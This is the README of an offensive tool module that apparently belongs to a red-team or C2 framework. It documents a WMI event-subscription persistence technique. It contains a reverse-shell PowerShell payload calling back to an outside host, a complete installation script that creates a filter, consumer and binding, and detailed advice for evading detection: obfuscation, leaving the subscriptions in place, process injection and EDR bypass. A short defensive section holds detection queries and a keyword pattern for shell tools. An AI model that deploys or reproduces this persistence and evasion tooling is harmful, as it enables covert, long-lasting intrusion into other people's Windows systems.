# WMI Event Subscriptions - Persistence Framework

## Overview

WMI Event Subscriptions provide **ghost persistence** - shell callbacks hidden in Windows WMI database with no file writes, no registry modifications, no scheduled tasks.

**Problem Solved:**
- ❌ Startup folder: Blue Team's first check
- ❌ Registry: ProcessMonitor/Autoruns alert immediately
- ✅ WMI database: Requires WMI knowledge to find (90% of admins don't know)

## Architecture

### Three Components

1. **__EventFilter** (Trigger)
   - Defines what to detect (WQL query)
   - Example: "System idle > 95% for 5 minutes"
   - Stored in: `root\subscription` WMI namespace

2. **__EventConsumer** (Action)
   - Defines what to execute
   - Types: CommandLineEventConsumer, ActiveScriptEventConsumer
   - Example: "Run powershell.exe [reverse shell]"

3. **__FilterToConsumerBinding** (Link)
   - Connects filter to consumer
   - Creates automatic subscription
   - Result: Event fires → Action executes

### Persistence Chain

```
System Reboots
    ↓
WmiPrvSE.exe (WMI Service) starts
    ↓
Checks __EventFilter subscriptions
    ↓
Startup event matches WQL query
    ↓
__FilterToConsumerBinding triggers
    ↓
__EventConsumer executes
    ↓
Shell callback to C2
    ↓
✅ Persistence achieved
```

## Trigger Types

| Trigger | When It Fires | Use Case |
|---------|---------------|----------|
| **IDLE** | System inactive > 95% for N minutes | Background callback |
| **LOGON** | User logs in (any user, any time) | User-triggered callback |
| **NETWORK** | Network adapter becomes active | Network-active callback |
| **STARTUP** | System boots (Winlogon service created) | Reboot persistence |
| **PERFORMANCE** | CPU/Memory threshold exceeded | Resource-dependent callback |

## WQL Query Examples

### Idle Trigger
```wql
SELECT * FROM __InstanceModificationEvent WITHIN 300
WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
AND TargetInstance.PercentIdleTime > 95
```

### Logon Trigger
```wql
SELECT * FROM __InstanceCreationEvent WITHIN 10
WHERE TargetInstance ISA 'Win32_LoggedInUser'
```

### Network Trigger
```wql
SELECT * FROM __InstanceModificationEvent WITHIN 30
WHERE TargetInstance ISA 'Win32_NetworkAdapter'
AND TargetInstance.NetConnectionStatus = 2
```

### Startup Trigger
```wql
SELECT * FROM __InstanceCreationEvent WITHIN 60
WHERE TargetInstance ISA 'Win32_Service'
AND TargetInstance.Name = 'Winlogon'
```

## Code Usage

### Basic Usage

```python
from cybermodules.wmi_persistence import WMIPersistence

wmi = WMIPersistence()

# Create idle-triggered persistence
payload = "powershell -c \"\\$s=New-Object Net.Sockets.TCPClient('192.168.1.100',443);...\"" 
subscription = wmi.create_idle_persistence(payload, idle_minutes=5)

# Get installation script
install_script = wmi.generate_installation_script(subscription)
print(install_script)  # Run this PowerShell script on target
```

### Multiple Trigger Redundancy

```python
# Install 4 different triggers - guarantees callback
subscriptions = {
    'idle': wmi.create_idle_persistence(payload, idle_minutes=5),
    'logon': wmi.create_logon_persistence(payload),
    'network': wmi.create_network_persistence(payload),
    'startup': wmi.create_startup_persistence(payload),
}

for trigger_type, sub in subscriptions.items():
    script = wmi.generate_installation_script(sub)
    # Execute each script on target
```

### Generate Cleanup Scripts

```python
# List all subscriptions
list_script = wmi.generate_list_script()

# Remove specific subscription
removal_script = wmi.generate_removal_script(subscription)
```

## PowerShell Installation Example

The framework generates PowerShell scripts like this:

```powershell
# Create Event Filter (the trigger)
$filterParams = @{
    Name = "Filter70b52b637ded"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.PercentIdleTime > 95"
}
$filter = Set-WmiInstance -Class __EventFilter -Arguments $filterParams -Namespace "root\subscription"

# Create Event Consumer (the action)
$consumerParams = @{
    Name = "Consumer4e702580340e"
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command C:\\shell.exe"
    KillTimeout = 120
}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments $consumerParams -Namespace "root\subscription"

# Bind them together
$bindingParams = @{
    Filter = $filter
    Consumer = $consumer
}
$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Arguments $bindingParams -Namespace "root\subscription"

# Result: Subscription created, shell.exe runs when system idle
```

## Why It's Undetectable

| Detection Method | Traditional | WMI |
|---|---|---|
| **Autoruns** | ❌ Listed | ✅ Not shown |
| **Registry Monitor** | ❌ Alerts | ✅ No registry mods |
| **ProcessMonitor** | ❌ File writes | ✅ No file I/O |
| **Startup Folder** | ❌ Obvious | ✅ No files |
| **Task Scheduler** | ❌ Listed | ✅ Not a task |
| **Net shell wmi** | - | ✗ Found (if searched) |
| **Get-WmiObject** | - | ✗ Listed (if audited) |

**Blue Team Needs:**
- WMI knowledge
- Specific hunting queries
- Continuous WMI auditing
- System admin to care about WMI (rare)

## Files

### [cybermodules/wmi_persistence.py](../cybermodules/wmi_persistence.py)
Main WMI persistence framework (600+ lines)

**Classes:**
- `TriggerType`: Enum (IDLE, LOGON, NETWORK, STARTUP, PERFORMANCE, CUSTOM)
- `ConsumerType`: Enum (COMMAND_LINE, ACTIVE_SCRIPT)
- `EventTrigger`: Dataclass for trigger definition
- `EventAction`: Dataclass for action definition
- `WMIQueryBuilder`: Static methods for WQL generation
- `WMIEventFilter`: Filter registration wrapper
- `WMIEventConsumer`: Consumer registration wrapper
- `WMIEventBinding`: Binding registration wrapper
- `WMIPersistence`: Main orchestrator

**Key Methods:**
- `create_idle_persistence(payload, idle_minutes)`
- `create_logon_persistence(payload)`
- `create_network_persistence(payload)`
- `create_startup_persistence(payload)`
- `generate_installation_script(subscription)`
- `generate_removal_script(subscription)`
- `generate_list_script()`

### [agents/wmi_persistence_handler.py](../agents/wmi_persistence_handler.py)
Beacon integration for WMI persistence (400+ lines)

**Class:** `WMIPersistenceHandler`

**Methods:**
- `install_idle_callback(shell_type, idle_minutes)`
- `install_logon_callback(shell_type)`
- `install_network_callback(shell_type)`
- `install_startup_callback(shell_type)`
- `install_all_triggers(execute=False)` - Install all 4 triggers for redundancy
- `execute_installation(subscription)` - Execute PS script on target

## Testing

### Run Tests

```bash
python tests/test_wmi_persistence_fixed.py
```

### Test Coverage

- ✅ WQL query generation for all trigger types
- ✅ Subscription creation (idle, logon, network, startup)
- ✅ PowerShell script generation
- ✅ Installation/removal/listing script generation
- ✅ Multiple subscriptions with unique names
- ✅ Complex/obfuscated payload handling
- ✅ Edge cases (empty payload, special characters, long payloads)
- ✅ All trigger types in one operation

**Result:** 20/20 tests passing ✅

## Operational Security

### Good Practices

1. **Random Names**
   ```
   ✗ "MaliciousFilter"
   ✓ "WMIEventFilter_a4f3c2e1"
   ```

2. **Obfuscated Payloads**
   ```
   ✗ Clear: powershell -c "whoami"
   ✓ Obfuscated: powershell -c [Convert]::FromBase64String(...) | IEX
   ```

3. **Legitimate Triggers**
   ```
   ✗ Weird: "Every 5 seconds"
   ✓ Real: "Idle 5+ minutes" or "On logon"
   ```

4. **Redundancy**
   ```
   Don't rely on single trigger
   Install: Idle + Logon + Network + Startup
   Guarantees at least one fires
   ```

5. **No Cleanup**
   ```
   Removing subscriptions = Red flag
   Leave them (blend with system WMI noise)
   ```

### Detection Evasion

**Level 1: Basic Hunters**
- ✅ Not detected (don't know to look)

**Level 2: WMI Hunters**
- ⚠ Found with Get-WmiObject
- ⚠ Can be obfuscated with random names
- ✅ Timing doesn't look suspicious (idle, logon, not "every 5 seconds")

**Level 3: SIEM + Splunk**
- ⚠ Event ID 5860 (WMI_CONSUMER_TIMER_ACTIVITY) logged
- ✅ Requires WMI audit logging enabled (most don't)
- ✅ Blends with normal system events

**Level 4: EDR + Threat Hunting**
- ⚠ WmiPrvSE.exe → cmd/powershell parent unusual
- ✅ Mitigated with: Process injection, indirect syscalls, parent process spoofing

## Advanced Techniques

### Combine With Other Evasion Layers

```
Persistence Layer (WMI)
    ↓ (hidden)
Evasion Layer 1 (Syscalls - EDR bypass)
    ↓ (no NTDLL hooks)
Evasion Layer 2 (Steganography - traffic hiding)
    ↓ (hidden in network noise)
C2 Communication
    ↓ (undetected)
✅ Ghost on network
```

### Process Injection

Instead of direct execution, inject into legitimate process:

```powershell
# Bad: WmiPrvSE → cmd.exe (suspicious parent)
CommandLineTemplate = "cmd.exe"

# Good: WmiPrvSE → svchost.exe (inject reverse shell)
CommandLineTemplate = "C:\\temp\\injector.exe svchost"
```

### VBScript Event Consumer

```powershell
# Instead of CommandLineEventConsumer
$consumerParams = @{
    Name = "VBConsumer_..."
    ScriptingEngine = "VBScript"
    ScriptText = "CreateObject(\"WScript.Shell\").Run \"powershell ...\""
}
Set-WmiInstance -Class ActiveScriptEventConsumer -Arguments $consumerParams
```

## Defense

### Detection Queries

**List all subscriptions:**
```powershell
Get-WmiObject -Class __EventFilter -Namespace "root\subscription"
Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription"
Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription"
```

**Look for suspicious patterns:**
```powershell
$filters = Get-WmiObject -Class __EventFilter -Namespace "root\subscription"
$filters | Where-Object {$_.Query -match "cmd|powershell|reverse|shell"}
```

**Monitor WMI events:**
```powershell
# Enable WMI event logging (PowerShell requires elevation)
wevtutil set-log Microsoft-Windows-WMI-Activity/Trace /enabled:true
```

### Mitigation

1. **Monitor WMI Event Log**
   - Event ID 5860 (consumer activity)
   - Event ID 5859 (consumer errors)

2. **EDR Integration**
   - Monitor WmiPrvSE.exe spawning shells
   - Alert on suspicious WMI queries

3. **Regular Audits**
   - Weekly WMI subscription scans
   - Compare against whitelist

4. **Disable WMI if Possible**
   ```powershell
   # Disable WMI Event Subscriptions
   Set-WmiInstance -Path __EventFilter -Argument @{Enabled=$false}
   ```

## Summary

| Aspect | Rating | Notes |
|--------|--------|-------|
| **Persistence** | ⭐⭐⭐⭐⭐ | Survives reboots, multiple triggers |
| **Stealth** | ⭐⭐⭐⭐ | Hidden but findable by WMI hunters |
| **Reliability** | ⭐⭐⭐⭐⭐ | Multiple redundancy ensures callback |
| **Complexity** | ⭐⭐⭐ | Medium - requires PowerShell knowledge |
| **Detection** | ⭐⭐⭐⭐ | 90% of blue teams won't find it |
| **Combined** | ⭐⭐⭐⭐⭐ | Best with syscalls + steganography |

## References

- [Microsoft WMI Documentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)
- [Event Driven Execution in WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/queuing-events)
- [Security Implications of WMI](https://attack.mitre.org/datasources/DS0020/)
- [SANS: WMI Persistence](https://www.sans.org/white-papers/)

---

**Status:** Framework complete and tested ✅
**Tests:** 20/20 passing ✅
**Ready for:** Windows deployment, C2 integration, threat hunting evasion
